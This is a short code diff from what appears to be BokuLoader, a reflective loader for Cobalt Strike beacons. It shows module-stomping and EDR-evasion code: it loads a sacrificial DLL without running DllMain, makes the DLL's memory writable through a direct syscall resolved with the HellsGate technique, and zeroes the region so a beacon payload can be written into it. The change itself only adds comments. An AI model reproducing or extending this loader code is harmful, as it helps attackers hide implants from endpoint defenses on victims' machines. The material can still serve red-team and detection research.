@@ -26,16 +26,17 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         //    hFile = 0 ;This parameter is reserved for future use. It must be NULL.
         //    DONT_RESOLVE_DLL_REFERENCES  (0x00000001) ; the system does not call DllMain
         base = api.LoadLibraryExA(((char*)rdll_src.dllBase+0x44),0,1);
-        //rdll_dst.dllBase = ((char*)base + 0x3000);
+        // write our .text section at DLL+0x4000 (first 0x1000 is the uncopied header)
         base = ((char*)base + 0x3000);
         oldprotect = 0;
         if(base){
+            // Add some extra size 
             size = rdll_src.size + 0x2000;
-            // Change memory protections of loaded beacon .text section to RW
             oldprotect = 0;
             // NtProtectVirtualMemory syscall
             HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
             ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
+            // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
             rdll_dst.dllBase = base;
         }
